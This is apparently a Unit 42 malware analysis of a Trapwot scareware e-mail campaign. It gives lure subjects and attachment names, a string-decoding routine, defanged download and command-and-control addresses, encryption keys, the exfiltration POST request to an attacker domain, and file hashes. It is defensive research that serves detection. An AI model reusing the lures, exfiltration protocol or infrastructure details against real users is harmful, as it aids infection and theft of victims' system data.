@@ -1,0 +1,257 @@
+Trapwot Scareware Activity Spikes in April
+
+In recent weeks, Unit 42 has been monitoring a new e-mail campaign distributing the Trapwot malware family. The Trapwot malware family is considered “scareware” or “rogue antivirus” because it attempts to mislead victims into believing their machine is infected with malware. It disguises itself as an anti-virus product, and attempts to encourage users into purchasing a non-existent protection.
+In total, our AutoFocus threat intelligence service has identified 380,000 emails carrying Trapwot in the past 30 days. These 380,000 e-mails have contained over 5,400 unique malware samples. These attacks have primarily targeted the insurance, higher education, and healthcare industries.
+Trapwot is just one of many variants of Rogue Antivirus programs that currently plague users. Readers should be skeptical of pop-ups that suggest their system is infected with malware and ask them to purchase a new product. As always, users should also avoid opening attachments delivered over e-mail that they are not expecting, no matter how enticing the content may be.
+Malware Distribution and Targets
+The attackers behind Trapwot are distributing it via e-mail, likely through a spam botnet. The following world map demonstrates the distributed nature of the origin of these emails.
+
+Figure 1. Trapwot Source Countries Shown in AutoFocus
+
+Figure 2. Trapwot E-mail Timeline in AutoFocus
+Executables with a filename suffix of ‘.scr’ were attached to emails distributed in this campaign. Filenames varied, however, they typically were formatted in one of the following ways:
+
+DOC_[random_numbers]-PDF.scr
+PIC[random_numbers]-JPG.scr
+
+Subjects for these emails varied as well. For emails sent with the ‘DOC_’ attachment names, the following subjects were seen.
+
+Read as soon as possible
+Document #87
+Order #371
+Your order #624
+Important
+
+Additionally, for emails sent with the ‘PIC’ attachment names, the following subjects were seen.
+
+Pretty or ugly?
+Should I upload this picture on facebook?
+My private photo for you
+Do you think I’m attractive?
+Check out this picture
+
+The spam email itself largely targeted the insurance and higher education industries, with roughly 120,000 and 93,000 emails received respectively. (Please note that the 120,000 number for insurance is slightly misleading as all but 1,600 of those emails were received by a single, large insurance company.)
+The healthcare industry has also seen roughly 31,000 emails carrying Trapwot.
+
+Figure 3. Trapwot Targeted Industries in AutoFocus
+Overall, the malware is primarily seen targeting the United States. However, the high number of samples targeting the large insurance provider likely account for this. As we can see in the diagram below, this malware is being distributed to many countries across the globe.
+
+Figure 4. Trapwot Destination Countries Shown in AutoFocus
+Stage One Downloader
+In the event an unsuspecting user were to open one of the attached executable files, the malware would download a remote executable file to the victim’s machine prior to executing it.
+A number of obfuscated strings are encountered within the stage one downloader. The following function is used to decode these strings:
+
+
+
+
+def decode(str):
+	out = ""
+	for x in str:
+		o = ord(x)
+		if o <= 109 and x.isalpha() and x.islower():
+			out += chr(o+13)
+		elif o <= 77 and x.isalpha() and x.isupper():
+			out += chr(o+13)
+		elif o >= 110 and x.isalpha() and x.islower():
+			out += chr(o-13)
+		elif o >= 78 and x.isalpha() and x.isupper():
+			out += chr(o-13)
+		else:
+			out += x
+	return out
+
+
+
+
+123456789101112131415
+
+def decode(str): out = "" for x in str: o = ord(x) if o <= 109 and x.isalpha() and x.islower(): out += chr(o+13) elif o <= 77 and x.isalpha() and x.isupper(): out += chr(o+13) elif o >= 110 and x.isalpha() and x.islower(): out += chr(o-13) elif o >= 78 and x.isalpha() and x.isupper(): out += chr(o-13) else: out += x return out
+
+
+
+
+
+Please refer to this IDAPython script that may be used to automatically decrypt strings encountered in the stage one downloader. These decoded strings are used to both load functions and libraries dynamically, as well as to obfuscate the URLs embedded within the malware. The following URLs were discovered in this sample.
+
+http://kashbox[.]ru/wat/wat.exe
+http://181.112.55[.]130/wat/wat.exe
+
+The second stage is downloaded using a minimalistic HTTP request, as we can see below.
+
+Figure 5. Stage One Downloader HTTP Request
+The user-agents witnessed in this campaign demonstrate a sense of immaturity on the attacker’s part. Other user-agents witnessed include the following:
+
+wutz0r
+supz0r
+jackpot
+cashmayne
+cash
+letsgo
+faggots
+checkin
+kash
+suckmyballz
+
+Once downloaded, the file is written to %TEMP%\winmgr.exe. It is then executed using a call to the CreateProcessA function. Finally, the malware displays a message box with the following text.
+Title: Microsoft Photo Viewer
+Message: windrcs32.dll cannot be found.
+This sample had the original filename of ‘PIC9811322311-JPG.scr,’ which explains why the message box has the title of ‘Microsoft Photo Viewer.’
+Stage Two Downloader and Trapwot
+When the stage two payload is executed, the malware begins by decrypting embedded URLs within the file using a single-byte XOR key of 0x65. Once decrypted, the following domains were discovered in this particular sample:
+
+updatemarketltd[.]in
+mastertodayversion[.]eu
+
+Stage two proceeds to check the current time and make a comparison against a statically set time. In the event the current time is later than this time, no malicious activity will occur.
+
+Figure 6. Stage Two Kill Timer
+In addition to the single-byte XOR string encryption, the stage two downloader also encrypts a number of strings using the XXTEA encryption algorithm. The following static key, represented in hexadecimal notation, is used to decrypt these embedded encrypted strings.
+61   C3   5E   A9   E2   8F   4E   D4   D4   DB   6D   1B   9A   3E   93   08
+Please refer to this IDAPython script that may be used to decrypt these strings.
+The malware proceeds to collect the following information from the victim machine. This information will be exfiltrated when the sample downloads Trapwot shortly.
+
+Microsoft Windows Operating System Version
+Operating System Language
+Malware Install Path
+Default Web Browser
+Malware Process Integrity Level
+
+Once this data has been collected, the malware will attempt to send the following POST request.
+POST /a/offers?i=0&u=548621bc51c9415ebaba30e0a9c1d8bb&f=1&v=21&a=119 HTTP/1.1
+Host: mastertodayversion[.]eu
+Content-Length: 69
+Cache-Control: no-cache
+[binary content]
+In the above request, there are four GET parameters. The following parameters have been identified:
+i : Incrementing counter
+u : Victim machine GUID
+f : Static value. Potentially indicates version of malware
+a : Integer generated using byte one and byte two of the executable’s PE timestamp
+The following example binary content is sent in this POST request.
+00000000  b0 a1 a5 a5 95 a5 a5 b7  a1 a5 a3 a4 14 b8 b6 a7   |…………….|
+00000010  a5 ac a1 b3 81 a5 e6 9f  f9 f0 d6 c0 d7 d6 f9 e4        |…………….|
+00000020  c1 c8 cc cb cc d6 d1 d7  c4 d1 ca d7 f9 c8 c9 d2        |…………….|
+00000030  d7 fa d6 c8 d5 c9 8b c0  dd c0 b1 ad a5 cc c0 dd     |…………….|
+00000040  d5 c9 ca d7 c0                                                                   |…..|
+This binary data is first encrypted using a single-byte XOR key of 0xA5. The underlying data has the following structure.
+
+Figure 7. Victim Information Data Structure
+This data includes the previously gathered victim information. Please refer to this provided Python script that can be used to decrypt and parse this data.
+Should the remote server be active, it will respond with binary content that includes an encrypted DLL file. This binary content has the following structure.
+
+Figure 8. Trapwot Downloaded DLL Structure
+This DLL is encrypted and written to disk. Finally, the stage two downloader will identify the DLL’s EntryPoint prior to calling this function.
+This DLL contains the actual Trapwot malware itself, which is responsible for spawning a fake anti-virus scanner and encouraging victims to buy the phony product, as seen below. Additionally, the malware may block access to legitimate websites and/or websites belonging to legitimate anti-virus vendors.
+
+Figure 9. False ‘Security Defender’ Scanner
+
+Figure 10. False ‘Action Center’ Display
+
+ Figure 11. False Virus Detection Alert
+
+Figure 12. Trapwot False Purchase Page
+Conclusion
+Overall, Trapwot is not an especially new malware family, as it dates back to early November 2014. However, the malware is certainly dangerous as it can hinder performance and functionality on an infected machine. Palo Alto Networks AutoFocus platform enabled Unit 42 to identify and track this campaign, which accounted for hundreds of thousands of emails. This particular campaign targeted a large number of clients in the previous weeks.
+Readers should be skeptical of pop-ups that suggest their system is infected with malware and ask them to purchase a new product. As always, users should also avoid opening attachments delivered over e-mail that they are not expecting, no matter how enticing the content may be.
+Appendix A – Sample Information
+Stage One Downloader
+
+
+
+MD5
+9f3ab8fb7d2fa7a468fdfd950471c251
+
+
+SHA1
+96a5e3f30b983847cce5452c12ab07d8efb46f12
+
+
+SHA256
+26285f4d32235ea966824e662d694de41bdebe5d28d5041df902848380f8ce8b
+
+
+File Type
+PE32 executable (GUI) Intel 80386, for MS Windows
+
+
+File Size
+20800 Bytes
+
+
+Entropy
+4.701195
+
+
+Compile Timestamp
+2015-04-19 09:53:58 UTC
+
+
+
+Stage Two Downloader
+
+
+
+MD5
+924b94b8432296662b708bcea9f377ad
+
+
+SHA1
+d84e62cccb831b6c90186034262f9794e4be0e8f
+
+
+SHA256
+069fe64f235d46a1f89b26f273f509af98ee4a59d60ee358c66b1ea60666aecb
+
+
+File Type
+PE32 executable (GUI) Intel 80386, for MS Windows
+
+
+File Size
+28672 Bytes
+
+
+Entropy
+4.554719
+
+
+Compile Timestamp
+2015-05-01 10:27:46 UTC
+
+
+
+Trapwot
+
+
+
+MD5
+502360b810b84aa06c1c6dda35aa8be0
+
+
+SHA1
+6c9449f90ec155581dd18b238c7ffeb96279f187
+
+
+SHA256
+cbd7570974525a833589b29463a694bdaa9be8a7563ce828f2c8072354dcd731
+
+
+File Type
+PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+
+
+File Size
+408580 Bytes
+
+
+Entropy
+7.129451
+
+
+Compile Timestamp
+2015-05-05 10:10:49 UTC
+
+
+
+ 
+
